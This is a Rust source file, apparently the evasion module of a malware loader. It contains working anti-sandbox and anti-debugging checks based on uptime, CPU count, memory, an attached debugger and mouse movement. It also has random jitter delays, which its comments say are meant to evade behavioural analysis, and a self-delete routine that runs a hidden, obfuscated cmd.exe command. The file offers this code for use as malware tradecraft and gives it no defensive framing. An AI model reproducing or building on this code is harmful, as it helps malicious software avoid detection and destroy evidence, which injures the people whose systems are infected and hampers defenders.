//! Evasion module for the loader
//!
//! Implements anti-sandbox checks, jitter timing, and self-delete functionality.

use crate::config;
use rand::Rng;

/// Generate jitter delay (random time before execution)
/// This evades behavioral analysis
pub fn get_jitter_delay() -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(config::JITTER_MIN_MS..=config::JITTER_MAX_MS)
}

/// Generate random delay between min and max milliseconds
pub fn get_random_delay(min_ms: u64, max_ms: u64) -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(min_ms..=max_ms)
}

/// Check if running in a sandbox environment
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn is_sandbox_detected() -> bool {
    // Check 1: System uptime (sandboxes are freshly started)
    if check_low_uptime() {
        return true;
    }

    // Check 2: CPU core count
    if check_low_cpu_count() {
        return true;
    }

    // Check 3: Physical memory
    if check_low_memory() {
        return true;
    }

    // Check 4: Debugger detection
    if check_debugger_present() {
        return true;
    }

    // Check 5: Mouse movement (real users move the mouse)
    if check_no_mouse_movement() {
        return true;
    }

    false
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
pub fn is_sandbox_detected() -> bool {
    false
}

/// Check if system uptime is suspiciously low
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_uptime() -> bool {
    use winapi::um::sysinfoapi::GetTickCount64;
    unsafe { GetTickCount64() < config::MIN_UPTIME_MS }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_uptime() -> bool {
    false
}

/// Check if CPU count is suspiciously low
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_cpu_count() -> bool {
    use std::mem::zeroed;
    use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};

    unsafe {
        let mut sys_info: SYSTEM_INFO = zeroed();
        GetSystemInfo(&mut sys_info);
        (sys_info.dwNumberOfProcessors as usize) < config::MIN_CPU_CORES
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_cpu_count() -> bool {
    false
}

/// Check if physical memory is suspiciously low
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_memory() -> bool {
    use std::mem::{size_of, zeroed};
    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut mem_status: MEMORYSTATUSEX = zeroed();
        mem_status.dwLength = size_of::<MEMORYSTATUSEX>() as u32;

        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
            mem_status.ullTotalPhys < config::MIN_MEMORY_BYTES
        } else {
            false
        }
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_memory() -> bool {
    false
}

/// Check if a debugger is attached
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_debugger_present() -> bool {
    use winapi::um::debugapi::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_debugger_present() -> bool {
    false
}

/// Check if mouse hasn't moved (indicates automated execution)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_no_mouse_movement() -> bool {
    use std::mem::zeroed;
    use std::thread;
    use std::time::Duration;
    use winapi::shared::windef::POINT;
    use winapi::um::winuser::GetCursorPos;

    unsafe {
        let mut pos1: POINT = zeroed();
        GetCursorPos(&mut pos1);

        thread::sleep(Duration::from_secs(1));

        let mut pos2: POINT = zeroed();
        GetCursorPos(&mut pos2);

        pos1.x == pos2.x && pos1.y == pos2.y
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_no_mouse_movement() -> bool {
    false
}

/// Self-delete the loader executable after execution
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn self_delete() -> Result<(), String> {
    use obfstr::obfstr;
    use std::env;
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    // Get path to current executable
    let exe_path = env::current_exe().map_err(|e| e.to_string())?;
    let exe_str = exe_path.to_str().ok_or("Invalid path")?;

    // Use cmd.exe to delete after a delay
    // This allows the process to exit before deletion
    let cmd = format!(
        "/C timeout /t 3 /nobreak >nul && del /f /q \"{}\"",
        exe_str
    );

    let cmd_exe = obfstr!("cmd.exe").to_string();

    // CREATE_NO_WINDOW = 0x08000000
    Command::new(&cmd_exe)
        .args(&[&cmd])
        .creation_flags(0x08000000)
        .spawn()
        .map_err(|e| e.to_string())?;

    Ok(())
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
pub fn self_delete() -> Result<(), String> {
    Ok(())
}
